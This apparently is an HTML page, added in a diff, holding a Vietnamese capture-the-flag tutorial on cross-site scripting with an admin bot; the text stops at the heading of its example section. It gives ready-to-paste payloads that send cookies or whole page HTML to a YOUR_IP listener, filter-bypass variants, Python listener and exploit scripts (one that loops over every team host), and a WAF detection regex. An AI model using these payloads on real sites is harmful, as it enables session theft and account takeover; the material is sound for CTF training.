@@ -1,0 +1,555 @@
+<title>XSS + Admin Bot — Web CTF</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500;700&display=swap">
+<style>
+:root{
+  --bg:#f4f2ee;--surface:#fffdf9;--surface-2:#ecebe4;--fg:#23211c;--muted:#6b665b;
+  --line:#d9d5cb;--accent:#b23a1e;--accent-soft:#f3dcd2;--ok:#2f7d4f;--ok-soft:#dcefe2;
+  --mem:#3a6ea5;--mem-soft:#dce8f4;--danger:#c0392b;--burp:#c2561a;--burp-soft:#f6e2d2;
+  --code-bg:#1d1b17;--code-fg:#e8e4d8;
+  --font-head:"Space Grotesk",system-ui,sans-serif;--font-body:"Inter",system-ui,sans-serif;
+  --font-mono:"JetBrains Mono",ui-monospace,monospace;--maxw:760px;
+}
+@media (prefers-color-scheme:dark){:root:not([data-theme="light"]){
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}}
+:root[data-theme="dark"]{
+  --bg:#161512;--surface:#201e1a;--surface-2:#2a2824;--fg:#ece8dd;--muted:#a39d8f;
+  --line:#38352f;--accent:#e86a48;--accent-soft:#3a251d;--ok:#67c08a;--ok-soft:#18271e;
+  --mem:#7fb0e0;--mem-soft:#1f2c3a;--danger:#e8705f;--burp:#e8884a;--burp-soft:#33231a;
+  --code-bg:#0f0e0c;--code-fg:#e8e4d8;color-scheme:dark;
+}
+*{box-sizing:border-box}
+body{background:var(--bg);color:var(--fg);font-family:var(--font-body);line-height:1.62;font-size:16px;-webkit-font-smoothing:antialiased}
+.wrap{max-width:var(--maxw);margin:0 auto;padding-inline:max(18px,env(safe-area-inset-left,0px)) max(18px,env(safe-area-inset-right,0px))}
+header.hero{border-bottom:1px solid var(--line);background:linear-gradient(180deg,var(--surface),transparent)}
+.hero-inner{padding-block:40px 24px}
+.kicker{font-family:var(--font-mono);font-size:12.5px;letter-spacing:.13em;text-transform:uppercase;color:var(--accent);font-weight:700}
+h1{font-family:var(--font-head);font-weight:700;font-size:clamp(28px,6vw,42px);line-height:1.05;margin:.3em 0 .25em;letter-spacing:-.015em}
+.sub{color:var(--muted);font-size:17px;max-width:62ch}
+.toc{display:flex;flex-wrap:wrap;gap:6px;margin-top:16px}
+.toc a{font-family:var(--font-mono);font-size:11px;text-decoration:none;color:var(--muted);border:1px solid var(--line);padding:4px 8px;border-radius:7px;background:var(--surface)}
+.toc a:hover{color:var(--accent);border-color:var(--accent)}
+h2{font-family:var(--font-head);font-weight:700;font-size:clamp(20px,4vw,26px);letter-spacing:-.01em;margin:0 0 2px}
+h3{font-family:var(--font-head);font-weight:600;font-size:16.5px;margin:20px 0 6px}
+section.block{padding-block:28px;border-bottom:1px solid var(--line)}
+.secnum{font-family:var(--font-mono);font-size:12px;color:var(--accent);font-weight:700;letter-spacing:.09em}
+p{margin:10px 0}strong{font-weight:600}a{color:var(--accent)}
+ul,ol{padding-left:21px;margin:9px 0}li{margin:5px 0}
+code{font-family:var(--font-mono);font-size:.86em;background:var(--surface-2);padding:1.5px 6px;border-radius:5px;word-break:break-word}
+pre{background:var(--code-bg);color:var(--code-fg);font-family:var(--font-mono);font-size:12.5px;line-height:1.56;padding:14px;border-radius:11px;overflow-x:auto;margin:10px 0}
+pre .c{color:#8a8574}pre .k{color:#e86a48}pre .s{color:#9cc591}pre .d{color:#7fb0e0}pre .n{color:#e8c56a}
+table{width:100%;border-collapse:collapse;margin:12px 0;font-size:13.5px}
+th,td{text-align:left;padding:8px 10px;border-bottom:1px solid var(--line);vertical-align:top}
+th{font-family:var(--font-mono);font-size:11px;text-transform:uppercase;letter-spacing:.04em;color:var(--muted)}
+tr:last-child td{border-bottom:none}
+.lead{font-size:17.5px}
+.twolayer{display:flex;flex-direction:column;gap:0;border-radius:14px;overflow:hidden;border:1px solid var(--line);margin:16px 0}
+.layer{padding:14px 16px}
+.layer.combat{background:var(--accent-soft);border-bottom:2px dashed var(--accent)}
+.layer.deep{background:var(--mem-soft)}
+.layer .lh{font-family:var(--font-head);font-weight:700;font-size:15px;display:flex;align-items:center;gap:7px;margin-bottom:3px}
+.layer.combat .lh{color:var(--accent)}.layer.deep .lh{color:var(--mem)}
+.layer p{margin:3px 0 0;font-size:14px}
+.note{border-left:3px solid var(--mem);background:var(--surface);padding:11px 14px;border-radius:0 10px 10px 0;margin:14px 0;font-size:14px}
+.note .tag{font-family:var(--font-mono);font-size:10.5px;text-transform:uppercase;letter-spacing:.09em;color:var(--muted);font-weight:700;display:block;margin-bottom:3px}
+.note.tip{border-color:var(--ok)}
+.note.warn{border-color:var(--danger)}
+.note.burp{border-color:var(--burp);background:var(--burp-soft)}
+.note.burp .tag{color:var(--burp)}
+.def{border:1px dashed var(--mem);background:var(--mem-soft);border-radius:10px;padding:10px 13px;margin:10px 0;font-size:13.5px}
+.def b{color:var(--mem)}
+.struct{display:flex;flex-direction:column;gap:1px;background:var(--line);border:1px solid var(--line);border-radius:12px;overflow:hidden;margin:12px 0}
+.srow{display:grid;grid-template-columns:30px 1fr;gap:10px;padding:10px 13px;background:var(--surface)}
+.srow .n{font-family:var(--font-mono);font-weight:700;color:var(--accent);font-size:13px}
+.srow .t{font-weight:600;font-size:14px}
+.srow .d{font-size:12.5px;color:var(--muted);margin-top:1px}
+.combatcard{border:2px solid var(--accent);border-radius:12px;overflow:hidden;margin:14px 0}
+.combatcard .ch{background:var(--accent);color:#fff;font-family:var(--font-head);font-weight:700;padding:8px 14px;font-size:14px}
+.combatcard .cb{padding:4px 14px 10px}
+.cslot{padding:10px 0;border-bottom:1px solid var(--line);font-size:13.5px}
+.cslot:last-child{border-bottom:none}
+.cslot .lab{font-family:var(--font-mono);font-size:10.5px;font-weight:700;letter-spacing:.05em;color:var(--accent);text-transform:uppercase;display:block;margin-bottom:4px}
+.pbreak{border:1px solid var(--line);border-radius:11px;overflow:hidden;margin:12px 0}
+.pbreak .ph{background:var(--surface-2);font-family:var(--font-mono);font-size:12.5px;padding:9px 13px;border-bottom:1px solid var(--line);word-break:break-word}
+.pbreak .pb{padding:10px 13px;font-size:13.5px}
+.pbreak .pb .part{margin:6px 0}
+.pbreak .pb .part code{background:var(--accent-soft);color:var(--accent);font-weight:600}
+.pbreak .resp{background:var(--ok-soft);padding:9px 13px;font-size:13px;border-top:1px dashed var(--line)}
+.pbreak .resp b{color:var(--ok)}
+.svgwrap{background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:12px;margin:14px 0}
+.svgwrap svg{width:100%;height:auto;display:block}
+details{background:var(--surface);border:1px solid var(--line);border-radius:10px;padding:9px 13px;margin:8px 0;font-size:13.5px}
+summary{cursor:pointer;font-weight:600;color:var(--accent)}
+.badge{display:inline-block;font-family:var(--font-mono);font-size:11px;padding:2px 8px;border-radius:999px;font-weight:700}
+.badge.easy{background:var(--ok-soft);color:var(--ok)}
+.badge.med{background:var(--accent-soft);color:var(--accent)}
+.badge.hard{background:color-mix(in srgb,var(--danger) 16%,transparent);color:var(--danger)}
+.ttoggle{position:fixed;top:calc(10px + env(safe-area-inset-top,0px));right:calc(10px + env(safe-area-inset-right,0px));z-index:20;font-family:var(--font-mono);font-size:11px;border:1px solid var(--line);background:var(--surface);color:var(--muted);padding:6px 10px;border-radius:999px;cursor:pointer;opacity:.9}
+footer{padding-block:22px 40px;color:var(--muted);font-size:13px}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px;border-radius:4px}
+@media(prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+
+<button class="ttoggle" id="themeBtn" aria-label="Đổi giao diện">◐</button>
+
+<header class="hero">
+  <div class="wrap hero-inner">
+    <div class="kicker">Web CTF · XSS &amp; Client-side</div>
+    <h1>XSS + Admin Bot</h1>
+    <p class="sub">Khi trang web hiển thị lại chữ bạn gõ ra màn hình <strong>mà không lọc</strong>, bạn chèn được
+    code JavaScript chạy trong trình duyệt của người khác. Trong CTF, "người khác" thường là <strong>admin
+    bot</strong> — 1 chương trình tự động (giống trình duyệt thật) do BTC chạy, ghé thăm URL bạn gửi, mang theo
+    cookie/session chứa flag.</p>
+    <div class="toc">
+      <a href="#combat">⚡ Combat</a><a href="#s00">00 Tóm tắt</a><a href="#s01">01 Nền tảng</a>
+      <a href="#s02">02 Vì sao</a><a href="#s03">03 Cơ chế</a><a href="#s04">04 Nhận diện</a>
+      <a href="#s05">05 Burp</a><a href="#s06">06 Payload</a><a href="#s07">07 Công cụ</a>
+      <a href="#s08">08 Script</a><a href="#s09">09 Ví dụ</a><a href="#s10">10 WAF</a>
+      <a href="#s11">11 Lỗi gặp</a><a href="#s12">12 Giới hạn</a><a href="#s13">13 Bài tập</a>
+    </div>
+  </div>
+</header>
+
+<main>
+
+<!-- 00 -->
+<section class="block" id="s00">
+ <div class="wrap">
+  <div class="secnum">00 / TÓM TẮT 1 PHÚT</div>
+  <h2>XSS + Admin Bot là gì, để làm gì?</h2>
+  <p class="lead"><strong>XSS (Cross-Site Scripting)</strong>: trang web lấy chữ bạn gõ (bình luận, tên hiển thị,
+  tìm kiếm) và in thẳng vào HTML mà không "khử độc" — nếu bạn gõ <code>&lt;script&gt;...&lt;/script&gt;</code>,
+  trình duyệt của <strong>người xem trang đó</strong> (không phải máy bạn) sẽ chạy code này y như code của chính
+  trang. Trong CTF có <strong>admin bot</strong> — bạn gửi 1 link cho bot, bot tự mở link đó bằng trình duyệt có
+  sẵn cookie/session của "admin" (hoặc nạn nhân có flag), code XSS của bạn chạy trong phiên đó và gửi được dữ
+  liệu (cookie, nội dung trang) về cho bạn.</p>
+  <div class="note tip"><span class="tag">Nếu chỉ nhớ một điều</span>
+  XSS một mình không lấy được gì cả nếu không có ai "xem" trang bị dính — trong CTF, chuỗi hành động luôn là:
+  (1) tìm chỗ chèn được script → (2) gửi URL chứa script đó cho admin bot → (3) bot tự mở, script chạy, gửi dữ
+  liệu về <strong>listener của bạn</strong> (không phải trả trực tiếp cho bạn như các bài trước).</div>
+ </div>
+</section>
+
+<!-- COMBAT CARD -->
+<section class="block" id="combat">
+ <div class="wrap">
+  <div class="secnum">⚡ COMBAT CARD — đọc trước, đủ để khai thác ngay</div>
+  <div class="combatcard">
+    <div class="ch">⚡ XSS + ADMIN BOT</div>
+    <div class="cb">
+      <div class="cslot"><span class="lab">🚩 Nhận ra trong 30 giây</span>
+        Có ô nhập liệu hiển thị lại ở trang khác (bình luận, tên hồ sơ, tin nhắn) + có chức năng "report
+        to admin"/"gửi link cho admin xem" ⟹ đây gần như chắc chắn hướng khai thác chính của challenge.
+      </div>
+      <div class="cslot"><span class="lab">✅ Tiền đề cần có</span>
+        Phải có cách đưa URL/nội dung độc tới trước mắt admin bot — thường có ô "Report URL" riêng trên trang,
+        hoặc chèn vào nơi admin chắc chắn sẽ xem (vd trang chi tiết đơn hàng admin duyệt).
+      </div>
+      <div class="cslot"><span class="lab">🔍 Dò nhanh bằng Burp</span>
+        Gõ <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> vào ô nghi ngờ, xem lại trang hiển thị — Response
+        (xem trong Burp) có in <strong>nguyên văn</strong> thẻ <code>&lt;script&gt;</code> (không bị encode thành
+        <code>&amp;lt;script&amp;gt;</code>) hay không.
+      </div>
+      <div class="cslot"><span class="lab">💥 Payload dán-chạy-ngay</span>
+<pre><code><span class="c"># 1. Xác nhận XSS (test trên trình duyệt của chính bạn trước)</span>
+&lt;script&gt;alert(document.domain)&lt;/script&gt;
+
+<span class="c"># 2. Payload thật -- gửi cookie về listener của bạn</span>
+&lt;script&gt;fetch('http://YOUR_IP:8000/?c='+document.cookie)&lt;/script&gt;
+
+<span class="c"># 3. Nếu thẻ script bị lọc, dùng event handler</span>
+&lt;img src=x onerror="fetch('http://YOUR_IP:8000/?c='+document.cookie)"&gt;</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">🐍 Script khai thác (điền host, chạy)</span>
+<pre><code><span class="k">import</span> requests, threading, http.server
+
+<span class="c"># Bước 1: dựng listener nhận cookie (xem mục 07 để biết cách chạy nền)</span>
+<span class="c"># Bước 2: gửi URL chứa XSS cho admin bot</span>
+requests.post(<span class="s">"http://TARGET/report"</span>, data={
+    <span class="s">"url"</span>: <span class="s">"http://TARGET/comment/123"</span>  <span class="c"># trang có chứa payload bạn đã post trước đó</span>
+})</code></pre>
+      </div>
+      <div class="cslot"><span class="lab">⚠️ Gotcha + 🛡️ WAF 1 dòng</span>
+        Thẻ <code>&lt;script&gt;</code> hay bị lọc/chặn bởi CSP — dùng event handler (<code>onerror</code>,
+        <code>onload</code>) hoặc thẻ khác (mục 06). Không có Internet trong A/D → listener PHẢI nằm trong mạng
+        thi (xem mục 07). WAF rule nhanh: chặn regex <code>&lt;script|on\w+\s*=</code>. Chưa hiểu? đọc tiếp dưới.
+      </div>
+    </div>
+  </div>
+ </div>
+</section>
+
+<!-- 01 -->
+<section class="block" id="s01">
+ <div class="wrap">
+  <div class="secnum">01 / NỀN TẢNG BẮT BUỘC</div>
+  <h2>Những thứ cần hiểu trước</h2>
+  <div class="def"><b>DOM (Document Object Model)</b> — cách trình duyệt biểu diễn 1 trang HTML thành cây các
+  phần tử để JavaScript có thể đọc/sửa. Khi JS chạy trong trang, nó có toàn quyền với DOM của trang đó — đọc
+  cookie, gửi request, sửa nội dung hiển thị.</div>
+  <div class="def"><b>Same-Origin Policy</b> — quy tắc trình duyệt: JavaScript của 1 trang chỉ được phép đọc dữ
+  liệu (cookie, nội dung DOM) của <strong>cùng origin</strong> (cùng domain+scheme+port). Đây chính là lý do XSS
+  nguy hiểm — nếu bạn chèn được script VÀO trang thật của nạn nhân, script đó chạy <strong>với tư cách chính
+  trang đó</strong>, vượt qua được rào cản Same-Origin Policy hoàn toàn hợp lệ.</div>
+  <div class="def"><b>Admin bot</b> — 1 chương trình (thường dùng Puppeteer/Playwright/Selenium điều khiển
+  Chrome headless) BTC chạy tự động, giả lập hành vi admin: đăng nhập, mở URL bạn cung cấp, rồi đóng lại. Flag
+  nằm trong cookie/trang mà bot có quyền xem, bạn không có.</div>
+  <p>Code hay viết sai (in thẳng input không encode):</p>
+  <pre><code><span class="c">// Node/Express — EJS template không tự escape nếu dùng &lt;%- thay &lt;%=</span>
+&lt;div&gt;Bình luận: &lt;%- comment %&gt;&lt;/div&gt;   <span class="c">// &lt;%- = KHÔNG escape, &lt;%= = CÓ escape</span></code></pre>
+ </div>
+</section>
+
+<!-- 02 -->
+<section class="block" id="s02">
+ <div class="wrap">
+  <div class="secnum">02 / VÌ SAO LỖ HỔNG TỒN TẠI</div>
+  <h2>Trình duyệt không phân biệt được "dữ liệu hiển thị" với "code chạy"</h2>
+  <p>HTML vốn dùng thẻ <code>&lt;...&gt;</code> để vừa đánh dấu cấu trúc vừa có thể chứa code
+  (<code>&lt;script&gt;</code>). Khi server in thẳng input người dùng vào giữa HTML mà không "khử độc" (escape —
+  biến <code>&lt;</code> thành <code>&amp;lt;</code> để trình duyệt hiểu là <em>ký tự</em>, không phải <em>bắt
+  đầu thẻ</em>), trình duyệt của người xem trang đó sẽ hiểu nhầm chữ bạn gõ là <strong>cấu trúc HTML thật</strong>
+  — y hệt bản chất của SQLi/Command Injection/LFI đã học, chỉ khác "ngôn ngữ nạn nhân" lần này là HTML+JS chạy
+  trên trình duyệt người khác, không phải SQL/shell chạy trên server.</p>
+ </div>
+</section>
+
+<!-- 03 -->
+<section class="block" id="s03">
+ <div class="wrap">
+  <div class="secnum">03 / CƠ CHẾ HOẠT ĐỘNG ← MỤC LÕI</div>
+  <h2>3 bước: chèn → bot mở → exfiltrate</h2>
+  <div class="svgwrap">
+  <svg viewBox="0 0 680 210" xmlns="http://www.w3.org/2000/svg">
+    <style>
+      .lbl{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--fg)}
+      .lbl-m{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--muted)}
+      .lbl-a{font-family:'JetBrains Mono',monospace;font-size:10px;fill:var(--accent);font-weight:700}
+      .box{fill:var(--surface);stroke:var(--line);stroke-width:1.5}
+      .box-a{fill:var(--accent-soft);stroke:var(--accent);stroke-width:1.5}
+      .arrow{stroke:var(--muted);stroke-width:1.5;fill:none;marker-end:url(#arr15)}
+    </style>
+    <defs><marker id="arr15" markerWidth="8" markerHeight="8" refX="6" refY="3" orient="auto">
+      <path d="M0,0 L6,3 L0,6 Z" fill="var(--muted)"/></marker></defs>
+    <rect x="10" y="20" width="195" height="55" rx="10" class="box-a"/>
+    <text x="22" y="40" class="lbl-m">(1) Bạn POST comment:</text>
+    <text x="22" y="56" class="lbl-a">&lt;script&gt;fetch(...)&lt;/script&gt;</text>
+
+    <path d="M205,48 H243" class="arrow"/>
+    <rect x="248" y="20" width="195" height="55" rx="10" class="box"/>
+    <text x="260" y="40" class="lbl-m">(2) Bạn báo URL này</text>
+    <text x="260" y="56" class="lbl">cho admin bot (report form)</text>
+
+    <path d="M443,48 H480" class="arrow"/>
+    <rect x="485" y="20" width="185" height="55" rx="10" class="box-a"/>
+    <text x="497" y="40" class="lbl-m">(3) Bot MỞ URL bằng</text>
+    <text x="497" y="56" class="lbl-a">cookie/session CỦA BOT</text>
+
+    <path d="M577,80 V105" class="arrow"/>
+    <rect x="248" y="110" width="195" height="55" rx="10" class="box-a"/>
+    <text x="260" y="130" class="lbl-m">Script chạy VỚI quyền bot</text>
+    <text x="260" y="146" class="lbl-a">document.cookie = cookie bot</text>
+
+    <path d="M248,135 H90" class="arrow"/>
+    <rect x="10" y="110" width="200" height="55" rx="10" class="box-a"/>
+    <text x="22" y="130" class="lbl-m">fetch() gửi cookie đó</text>
+    <text x="22" y="146" class="lbl-a">tới listener của BẠN -&gt; lấy flag</text>
+  </svg>
+  </div>
+  <p>Điểm quan trọng nhất: bước (3) script chạy <strong>trong trình duyệt của bot</strong>, không phải trình
+  duyệt của bạn — nên <code>document.cookie</code> lúc đó là cookie <strong>của bot</strong> (có quyền admin),
+  dù chính bạn là người viết ra đoạn code đó. Đây là lý do XSS+bot nguy hiểm: bạn "mượn" được quyền của nạn nhân
+  mà không cần biết mật khẩu họ.</p>
+ </div>
+</section>
+
+<!-- 04 -->
+<section class="block" id="s04">
+ <div class="wrap">
+  <div class="secnum">04 / NHẬN DIỆN KHI GẶP CHALLENGE</div>
+  <h2>Bảng dấu hiệu</h2>
+  <table>
+    <tr><th>Dấu hiệu quan sát được</th><th>Ý nghĩa</th></tr>
+    <tr><td>Có ô "Report to admin"/"Send URL for review" trên trang</td><td>Chính xác là cơ chế admin bot của CTF</td></tr>
+    <tr><td>Bình luận/bio/tên hiển thị lại ở trang người khác xem được</td><td>Nơi chèn stored XSS</td></tr>
+    <tr><td>Gõ <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> → thấy popup alert khi xem lại chính trang đó</td><td>Xác nhận XSS cơ bản hoạt động (reflected hoặc stored)</td></tr>
+    <tr><td>Flag không nằm ở đâu bạn truy cập được trực tiếp (không IDOR, không SQLi lộ)</td><td>Gợi ý mạnh: flag chỉ hiện với "admin xem", cần dùng bot để lấy hộ</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 05 -->
+<section class="block" id="s05">
+ <div class="wrap">
+  <div class="secnum">05 / KHAI THÁC BẰNG BURP SUITE</div>
+  <h2>Bấm gì (từng bước)</h2>
+  <div class="note burp"><span class="tag">Bước 1-2 — xác nhận XSS trước khi gửi cho bot</span>
+  <ol style="margin:4px 0 0">
+    <li>Gõ payload test (<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>) vào ô nghi ngờ, submit.</li>
+    <li>Burp bắt request, xem Response có chứa nguyên văn thẻ script không (không bị encode).</li>
+    <li><strong>Mở lại trang đó bằng trình duyệt thật</strong> (không chỉ xem trong Burp) để xác nhận alert có
+    popup thật — Burp chỉ cho xem HTML thô, không tự chạy JavaScript.</li>
+  </ol></div>
+  <div class="note burp"><span class="tag">Bước 3 — đổi payload test thành payload thật, báo cho bot</span>
+  Sau khi xác nhận XSS cơ bản ăn, sửa payload thành bản thật (fetch về listener của bạn — mục 06), submit lại,
+  rồi tìm form "Report URL" trên trang, gửi đúng URL chứa payload đó.</div>
+ </div>
+</section>
+
+<!-- 06 -->
+<section class="block" id="s06">
+ <div class="wrap">
+  <div class="secnum">06 / PAYLOAD ĐẦY ĐỦ THEO BIẾN THỂ</div>
+  <h2>Chọn đúng kỹ thuật theo tình huống</h2>
+
+  <h3>A. Phân loại XSS theo nơi payload "sống"</h3>
+  <table>
+    <tr><th>Loại</th><th>Đặc điểm</th><th>Cách khai thác cho bot</th></tr>
+    <tr><td><strong>Stored</strong></td><td>Payload lưu vào database (bình luận, bio), hiện cho MỌI người xem trang đó</td><td>Chỉ cần post 1 lần, báo URL trang đó cho bot — không cần lặp lại</td></tr>
+    <tr><td><strong>Reflected</strong></td><td>Payload chỉ hiện ra khi URL có đúng tham số đó (vd <code>?q=&lt;script&gt;...</code>)</td><td>Phải gửi NGUYÊN URL đầy đủ (kèm payload trong query string) cho bot, không chỉ URL trang gốc</td></tr>
+  </table>
+
+  <h3>B. Payload cơ bản + biến thể bypass filter</h3>
+  <table>
+    <tr><th>Tình huống</th><th>Payload</th></tr>
+    <tr><td>Không lọc gì</td><td><code>&lt;script&gt;fetch('http://YOUR_IP:8000/?c='+document.cookie)&lt;/script&gt;</code></td></tr>
+    <tr><td>Lọc thẻ <code>&lt;script&gt;</code></td><td><code>&lt;img src=x onerror="fetch('http://YOUR_IP:8000/?c='+document.cookie)"&gt;</code></td></tr>
+    <tr><td>Lọc cả <code>img</code>/<code>onerror</code> phổ biến</td><td><code>&lt;svg onload="fetch('http://YOUR_IP:8000/?c='+document.cookie)"&gt;</code>, <code>&lt;body onload=...&gt;</code>, <code>&lt;details open ontoggle=...&gt;</code></td></tr>
+    <tr><td>Lọc dấu ngoặc kép</td><td>Dùng dấu nháy đơn, hoặc không cần ngoặc: <code>&lt;svg/onload=fetch(`http://YOUR_IP:8000/?c=`+document.cookie)&gt;</code></td></tr>
+    <tr><td>Lọc chữ thường (blacklist <code>script</code>, <code>onerror</code>...)</td><td>Đổi hoa/thường: <code>&lt;ScRiPt&gt;</code>, <code>OnErRoR</code> (HTML không phân biệt hoa thường ở tên thẻ/thuộc tính)</td></tr>
+  </table>
+
+  <h3>C. Lấy gì ngoài cookie (khi cookie có HttpOnly, không đọc được qua JS)</h3>
+  <table>
+    <tr><th>Mục tiêu</th><th>Payload</th></tr>
+    <tr><td>Nội dung HTML trang bot đang xem (chứa flag trực tiếp trên trang)</td><td><code>&lt;script&gt;fetch('http://YOUR_IP:8000/?c='+encodeURIComponent(document.documentElement.outerHTML))&lt;/script&gt;</code></td></tr>
+    <tr><td>Thực hiện hành động THAY bot (vd submit 1 form, click 1 nút) — khi không cần đọc dữ liệu, chỉ cần bot "làm hộ"</td><td><code>&lt;script&gt;fetch('/admin/action', {method:'POST', credentials:'include'})&lt;/script&gt;</code> (đi kèm CSRF nếu có, xem bài CSRF)</td></tr>
+  </table>
+  <div class="note tip"><span class="tag">HttpOnly cookie</span>Nếu cookie có cờ <code>HttpOnly</code>, JavaScript
+  KHÔNG đọc được <code>document.cookie</code> — nhưng script vẫn chạy được với quyền của bot, vẫn
+  <code>fetch()</code> được API nội bộ (trình duyệt tự đính kèm cookie dù JS không đọc được giá trị) — dùng cách
+  C thay vì cố đọc cookie trực tiếp.</div>
+ </div>
+</section>
+
+<!-- 07 -->
+<section class="block" id="s07">
+ <div class="wrap">
+  <div class="secnum">07 / CÔNG CỤ THỰC CHIẾN: LISTENER &amp; KHO PAYLOAD</div>
+  <h2>Dựng listener nhận dữ liệu từ bot</h2>
+
+  <h3>A. Kho payload offline</h3>
+  <p><code>~/hoc/CTF/Tools/web/PayloadsAllTheThings/XSS Injection/</code> và
+  <code>~/hoc/CTF/Tools/web/SecLists/Fuzzing/XSS/</code> — nhiều biến thể bypass filter hơn bảng mục 06, dùng khi các
+  payload mẫu không ăn.</p>
+
+  <h3>B. Listener nhận dữ liệu — Python http.server (giống bài XXE)</h3>
+  <pre><code><span class="c"># Dựng server đơn giản, tự in mọi request tới (bao gồm cookie/data exfil)</span>
+python3 -m http.server 8000
+
+<span class="c"># Hoặc dùng server có log rõ hơn, bắt query string riêng</span>
+python3 -c <span class="s">"
+from http.server import HTTPServer, BaseHTTPRequestHandler
+class H(BaseHTTPRequestHandler):
+    def do_GET(self):
+        print('LEAK:', self.path)
+        self.send_response(200); self.end_headers()
+HTTPServer(('0.0.0.0', 8000), H).serve_forever()
+"</span></code></pre>
+  <div class="note warn"><span class="tag">Lưu ý A/D — không có Internet</span>Listener PHẢI chạy trên máy/IP
+  nằm <strong>trong mạng thi đấu</strong>. Dùng đúng IP thật của máy bạn trong mạng đó (không phải
+  <code>127.0.0.1</code> — đó là loopback của chính trình duyệt bot, không phải máy bạn). Hỏi BTC xem bot có
+  route được tới IP đội mình không — nếu không, phải tìm cách lưu dữ liệu leak vào ngay 1 endpoint công khai của
+  chính service rồi tự đọc lại (xem mục 11).</div>
+ </div>
+</section>
+
+<!-- 08 -->
+<section class="block" id="s08">
+ <div class="wrap">
+  <div class="secnum">08 / VIẾT SCRIPT KHAI THÁC (3 BẢN)</div>
+  <h2>Từ tay-gõ-Burp sang script tự động</h2>
+
+  <h3>(A) Bản thủ công — để HIỂU từng bước</h3>
+  <pre><code><span class="k">import</span> requests
+
+url = <span class="s">"http://TARGET"</span>
+payload = <span class="s">"&lt;script&gt;fetch('http://YOUR_IP:8000/?c='+document.cookie)&lt;/script&gt;"</span>
+
+<span class="c"># Bước 1: đăng bình luận chứa payload</span>
+r = requests.post(<span class="s">f"{url}/comment"</span>, data={<span class="s">"text"</span>: payload})
+comment_url = <span class="s">f"{url}/view/latest"</span>   <span class="c"># URL trang hiện bình luận vừa đăng</span>
+
+<span class="c"># Bước 2: báo URL này cho admin bot</span>
+requests.post(<span class="s">f"{url}/report"</span>, data={<span class="s">"url"</span>: comment_url})
+
+<span class="c"># Bước 3: xem listener (chạy riêng ở terminal khác) để nhận cookie</span></code></pre>
+
+  <h3>(B) Bản gọn chắc — kèm listener trong cùng script</h3>
+  <pre><code><span class="k">import</span> re, requests, threading
+<span class="k">from</span> http.server <span class="k">import</span> HTTPServer, BaseHTTPRequestHandler
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+leaked = []
+
+<span class="k">class</span> <span class="d">Handler</span>(BaseHTTPRequestHandler):
+    <span class="k">def</span> <span class="d">do_GET</span>(self):
+        leaked.append(self.path)
+        self.send_response(200); self.end_headers()
+    <span class="k">def</span> <span class="d">log_message</span>(self, *args): <span class="k">pass</span>   <span class="c"># tắt log mặc định cho gọn</span>
+
+<span class="k">def</span> <span class="d">start_listener</span>():
+    HTTPServer((<span class="s">"0.0.0.0"</span>, 8000), Handler).serve_forever()
+
+threading.Thread(target=start_listener, daemon=<span class="k">True</span>).start()
+
+<span class="c"># Gửi payload + report cho bot (như bản A)</span>
+<span class="c">#  ... sau vài giây, kiểm tra 'leaked' xem có dữ liệu chưa</span>
+<span class="k">import</span> time; time.sleep(10)
+<span class="k">print</span>(<span class="s">"Dữ liệu nhận được:"</span>, leaked)</code></pre>
+
+  <h3>(C) Bản A/D tái dùng — chạy mọi đội, mọi round (chèn payload lấy từ chính nội dung HTML)</h3>
+  <pre><code><span class="k">import</span> re, requests
+
+FLAG_RE = re.compile(<span class="s">r"FHACKER2026\{[0-9a-f]{64}\}"</span>)
+<span class="c"># payload tự exfiltrate luôn nội dung trang -- không cần listener riêng nếu có endpoint public để ghi lại</span>
+PAYLOAD = (<span class="s">"&lt;script&gt;fetch('http://YOUR_IP:8000/leak',{method:'POST',"</span>
+           <span class="s">"body:document.documentElement.outerHTML})&lt;/script&gt;"</span>)
+
+<span class="k">def</span> <span class="d">exploit_xss</span>(host):
+    <span class="k">try</span>:
+        requests.post(<span class="s">f"http://{host}/comment"</span>, data={<span class="s">"text"</span>: PAYLOAD}, timeout=5)
+        requests.post(<span class="s">f"http://{host}/report"</span>,
+                data={<span class="s">"url"</span>: <span class="s">f"http://{host}/view/latest"</span>}, timeout=5)
+        <span class="k">return</span> <span class="k">True</span>   <span class="c"># việc lấy flag thật sự xảy ra ở listener, chạy riêng</span>
+    <span class="k">except</span> requests.RequestException:
+        <span class="k">return</span> <span class="k">False</span>
+
+<span class="k">if</span> __name__ == <span class="s">"__main__"</span>:
+    <span class="k">for</span> host <span class="k">in</span> open(<span class="s">"teams.txt"</span>).read().split():
+        ok = exploit_xss(host)
+        <span class="k">print</span>(host, <span class="s">"đã gửi báo cáo cho bot"</span> <span class="k">if</span> ok <span class="k">else</span> <span class="s">"lỗi"</span>)
+<span class="c"># Chạy song song listener riêng để hứng dữ liệu trả về từ TẤT CẢ các đội</span></code></pre>
+  <div class="note tip"><span class="tag">Khác biệt với các bài trước</span>Script khai thác XSS+bot
+  <strong>KHÔNG trả flag ngay</strong> trong response của chính nó (vì bot mới là người "chạy" payload, không
+  phải request của bạn) — luôn cần 1 listener chạy riêng, chờ dữ liệu từ bot gửi về sau một khoảng trễ.</div>
+ </div>
+</section>
+
+<!-- 09 -->
+<section class="block" id="s09">
+ <div class="wrap">
+  <div class="secnum">09 / VÍ DỤ THỰC TẾ END-TO-END</div>
